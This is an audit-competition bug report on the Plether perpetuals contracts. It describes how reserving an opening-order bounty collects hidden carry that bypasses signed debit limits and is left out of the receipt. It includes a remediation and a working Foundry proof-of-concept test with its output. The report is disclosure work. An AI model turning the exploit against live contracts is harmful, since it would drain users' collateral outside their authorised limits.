# \#97847 [SC-Low] Opening bounty reservation bypasses carry debit bounds

**Submitted on Nov 3rd 2026 at 14:50:41 UTC by @TaiChi_Audit_Group for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #97847
- **Report Type:** Smart Contract
- **Report severity:** Low
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)

## Description

## Summary
Reserving the bounty for an increase realizes accrued carry but reports an opening commitment containing only the bounty. The unreported carry therefore bypasses both `maxGrossAccountDebitAssets` and `maxActionChargeAssets`, and is absent from the terminal receipt even when the account self-executes the order.

## Description
An opening/increase commitment calls `_reserveExecutionBounty()`. For a non-close, this function populates only `bountyFromFreeAssets` and then locks the bounty through `MarginClearinghouse.lockReservedSettlement()` ([src/router/OrderReservationAccounting.sol:108-128](src/router/OrderReservationAccounting.sol:108-128)). The lock is not classification-only: it first invokes the Engine carry hook, which realizes all currently collectible carry from position pledge and free settlement before locking the bounty ([src/MarginClearinghouse.sol:812-824](src/MarginClearinghouse.sol:812-824)).

```solidity
effects.bountyFromFreeAssets = bounty;
// effects.carryCollectedAssets remains zero
clearinghouse.lockReservedSettlement(account, bounty);
```

Despite that debit, `OrderLifecycleBook.recordCommitment()` sees `effects.carryCollectedAssets == 0`, so its gross- and action-charge checks cover only the opening bounty ([src/OrderLifecycleBook.sol:327-360](src/OrderLifecycleBook.sol:327-360)). At execution, the evaluator starts from the already-checkpointed account and only accounts for carry accrued after commitment. It also adds stored commitment effects only for closes. Consequently, neither execution bounds nor the authenticated receipt ever include the carry paid while the opening bounty was reserved.

Self-execution makes the violation especially clear. The reserved bounty is released back to the source account, so it has no net effect on settlement custody, while the hidden commitment-time carry remains permanently paid to the pool. A request whose ceilings permit only the bounty and expected execution-time charges can therefore cause a much larger account debit and still execute successfully.

This defeats the documented per-order financial authority used by smart-account session keys and autonomous trading agents. A compromised or overly aggressive key authorized only to submit bounded Router orders can force payment of all accrued carry, reduce position collateral, and potentially move the account toward liquidation despite supplying limits that prohibit that debit.

## Impact Severity

**Medium**

The hidden debit can consume substantial position pledge and free settlement beyond the account owner's authenticated per-order limits, reducing the user's collateral and moving the account toward liquidation. A bounded trading key can therefore inflict direct financial damage outside its delegated authority, matching the competition's Medium-severity griefing impact.

## Why This Is Valid and Not a Known Issue

This is an in-scope bounded-authority failure across `OrderReservationAccounting`, `MarginClearinghouse`, `OrderLifecycleBook`, and the Router receipt path: opening bounty reservation synchronously collects carry, records zero commitment carry, enforces limits against an incomplete debit, and produces an authenticated receipt that omits the collection. The fact that the carry had accrued previously does not change that the bounded action triggers its transfer outside the signed limits. This root is distinct from `MED-22`, which concerns discarded fractional carry, and `LOW-34`, which concerns assessed-versus-collected reporting for closes; the PoC instead proves that an opening/increase transfers carry, exceeds both authenticated ceilings, and still yields a valid receipt.

## Remediation

Make opening bounty reservation return the exact carry effects caused by its checkpoint. A dedicated Engine-mediated reservation path should capture settlement before/after, collected and outstanding carry, and bounty funding, then pass those values to `recordCommitment()`.

At execution, include stored commitment carry for opens/increases as well as closes before enforcing bounds and constructing the receipt. Count the bounty exactly once, and add equality/one-atom boundary regressions for external and self-executed increases.

## Proof of Concept

## Proof of Concept

The inline test passed on the pinned commit with Forge 1.5.1. It first measures the execution economics, restores the pre-commit state, signs exact limits, and proves that the same bounded increase still transfers additional carry outside those limits. It also authenticates the emitted receipt through `OrderLifecycleBook.verifyReceipt`.

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "../perps/BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {IOrderLifecycleBook} from "@plether/perps/interfaces/IOrderLifecycleBook.sol";
import {Vm} from "forge-std/Vm.sol";

contract OpeningCarryBypassesBoundsPoC is BasePerpTest {
    address constant ACCOUNT = address(0xC0FFEE);
    uint256 constant MARK = 1e8;

    function test_PoC_HiddenCarryExceedsSignedBounds() public {
        _fundTrader(ACCOUNT, 50_000e6);
        _open(ACCOUNT, CfdTypes.Side.LONG, 100_000e18, 10_000e6, MARK);

        vm.warp(vm.getBlockTimestamp() + 365 days);
        vm.prank(address(router));
        engine.updateMarkPrice(MARK, uint64(vm.getBlockTimestamp()));

        uint256 pristine = vm.snapshotState();
        OrderV3Types.OrderRequest memory permissive = _request(bytes32("measure"));
        uint256 preCommit = clearinghouse.balanceAssets(ACCOUNT);
        vm.prank(ACCOUNT);
        uint64 measuredId = router.commitOrder(permissive);
        uint256 hiddenCarry = preCommit - clearinghouse.balanceAssets(ACCOUNT);

        OrderV3Types.OrderReceipt memory measured = _executeAndRead(measuredId);
        assertEq(measured.commitment.carryCollectedAssets, 0);
        assertLt(uint256(measured.economics.carryAssets), hiddenCarry);

        uint256 permittedGross = measured.economics.grossAccountDebitAssets;
        uint256 permittedCharge = measured.economics.actionChargeAssessedAssets;
        assertTrue(vm.revertToState(pristine));

        OrderV3Types.OrderRequest memory bounded = _request(bytes32("bounded"));
        bounded.bounds.maxGrossAccountDebitAssets = permittedGross;
        bounded.bounds.maxActionChargeAssets = permittedCharge;
        bounded.bounds.maxExplicitFeesAssets = measured.economics.executionFeeAssets;

        uint256 settlementBefore = clearinghouse.balanceAssets(ACCOUNT);
        uint256 poolBefore = settlementToken.balanceOf(address(pool));
        vm.prank(ACCOUNT);
        uint64 orderId = router.commitOrder(bounded);

        uint256 outsideBounds = settlementBefore - clearinghouse.balanceAssets(ACCOUNT);
        OrderV3Types.PendingIntent memory pending = router.lifecycleBook().pendingIntent(orderId);
        assertEq(outsideBounds, hiddenCarry);
        assertGt(outsideBounds, 0);
        assertEq(settlementToken.balanceOf(address(pool)) - poolBefore, outsideBounds);
        assertEq(pending.commitment.carryCollectedAssets, 0);

        OrderV3Types.OrderReceipt memory receipt = _executeAndRead(orderId);
        assertEq(uint8(receipt.status), uint8(OrderV3Types.LifecycleStatus.Executed));
        assertEq(receipt.commitment.carryCollectedAssets, 0);
        assertEq(receipt.economics.grossAccountDebitAssets, permittedGross);
        assertEq(receipt.economics.actionChargeAssessedAssets, permittedCharge);
        assertGt(
            outsideBounds + receipt.economics.grossAccountDebitAssets,
            bounded.bounds.maxGrossAccountDebitAssets
        );
        assertGt(
            outsideBounds + receipt.economics.actionChargeAssessedAssets,
            bounded.bounds.maxActionChargeAssets
        );
        assertLt(
            clearinghouse.balanceAssets(ACCOUNT),
            settlementBefore - bounded.bounds.maxGrossAccountDebitAssets
        );
    }

    function _request(bytes32 clientId) internal view returns (OrderV3Types.OrderRequest memory r) {
        r.clientOrderId = clientId;
        r.side = CfdTypes.Side.LONG;
        r.sizeDelta = 10_000e18;
        r.marginDelta = 1000e6;
        r.targetPrice = MARK;
        r.bounds = OrderV3Types.ExecutionBounds({
            submitBy: uint64(vm.getBlockTimestamp() + 60),
            executionWindowSeconds: 60,
            allowedExecutionModes: 7,
            expectedConfigHash: router.lifecycleBook().currentExecutionConfigHash(),
            maxExecutionBountyAssets: type(uint256).max,
            maxExecutionNotionalAssets: type(uint256).max,
            maxGrossAccountDebitAssets: type(uint256).max,
            maxActionChargeAssets: type(uint256).max,
            maxExplicitFeesAssets: type(uint256).max,
            maxPostPositionSize: type(uint256).max,
            minPostSettlementBalanceAssets: 0,
            minPostPositionEquityAssets: 0,
            maxPostLeverageBps: type(uint32).max
        });
    }

    function _executeAndRead(uint64 orderId)
        internal
        returns (OrderV3Types.OrderReceipt memory receipt)
    {
        vm.recordLogs();
        vm.prank(ACCOUNT);
        OrderV3Types.ExecutionResult memory result =
            router.executeOrder(orderId, _mockPythUpdateData(MARK));

        Vm.Log[] memory logs = vm.getRecordedLogs();
        IOrderLifecycleBook book = IOrderLifecycleBook(address(router.lifecycleBook()));
        for (uint256 i; i < logs.length; ++i) {
            if (
                logs[i].emitter != address(book) || logs[i].topics.length != 4
                    || logs[i].topics[0] != IOrderLifecycleBook.OrderFinalized.selector
            ) continue;

            (bytes32 hash,, uint64 terminalTime, OrderV3Types.OrderReceipt memory found) =
                abi.decode(logs[i].data, (bytes32, uint64, uint64, OrderV3Types.OrderReceipt));
            if (found.orderId != orderId) continue;
            assertTrue(book.verifyReceipt(found, terminalTime));
            assertEq(hash, result.receiptHash);
            return found;
        }
        revert("missing receipt");
    }
}
```

### Run Command

Temporarily save the Solidity block as `test/poc/TMOpeningCarry.t.sol`, then run from `packages/perps`:

```bash
forge test --match-path test/poc/TMOpeningCarry.t.sol -vv
```

### Verified Output

```text
[PASS] test_PoC_HiddenCarryExceedsSignedBounds() (gas: 5717060)
Suite result: ok. 1 passed; 0 failed; 0 skipped
```
